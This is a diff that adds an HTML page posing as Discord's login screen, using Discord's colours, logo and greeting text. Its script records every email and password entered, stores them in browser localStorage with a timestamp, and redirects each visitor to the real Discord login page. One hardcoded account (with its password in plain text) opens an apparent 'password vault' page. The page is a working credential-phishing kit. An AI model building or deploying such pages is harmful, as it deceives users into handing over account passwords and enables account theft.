@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Login</title>
+    <style>
+        body {
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #2C2F33; /* Discord dark mode background */
+            color: #FFFFFF; /* White text for contrast */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #36393E; /* Slightly lighter background for the container */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 320px;
+            text-align: center;
+        }
+        .logo {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #4F545C; /* Border color for input fields */
+            border-radius: 4px;
+            font-size: 14px;
+            background-color: #2F3136; /* Darker background for input fields */
+            color: #FFFFFF; /* White text for input fields */
+        }
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #7289da; /* Discord blue for the button */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .form-group button:hover {
+            background-color: #637bbd; /* Slightly darker blue on hover */
+        }
+        .login-details {
+            margin-top: 20px;
+            display: none; /* Hide login details by default */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://discord.com/assets/8c920599b44a3d3f14d3f409f54d4a5f.svg" alt="Discord Logo" class="logo">
+        <h2>Welcome back!</h2>
+        <p>We're so excited to see you again!</p>
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="email" id="email" placeholder="Email" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <div class="form-group">
+                <button type="submit">Login</button>
+            </div>
+        </form>
+        <div class="login-details" id="loginDetails"></div>
+    </div>
+
+    <script>
+        const loginDetails = JSON.parse(localStorage.getItem('loginDetails')) || [];
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const dateTime = new Date().toLocaleString();
+            const ipAddress = '127.0.0.1'; // Replace with actual IP address retrieval logic
+
+            const loginAttempt = { email, password, dateTime, ipAddress, redirected: false };
+
+            if (email === 'aibel@gmail.com' && password === '123456') {
+                loginAttempt.redirected = false;
+                loginDetails.push(loginAttempt);
+                localStorage.setItem('loginDetails', JSON.stringify(loginDetails));
+                window.location.href = 'user_password_vault.html';
+            } else {
+                loginAttempt.redirected = true;
+                loginDetails.push(loginAttempt);
+                localStorage.setItem('loginDetails', JSON.stringify(loginDetails));
+                window.location.href = 'https://discord.com/login';
+            }
+        });
+    </script>
+</body>
+</html>
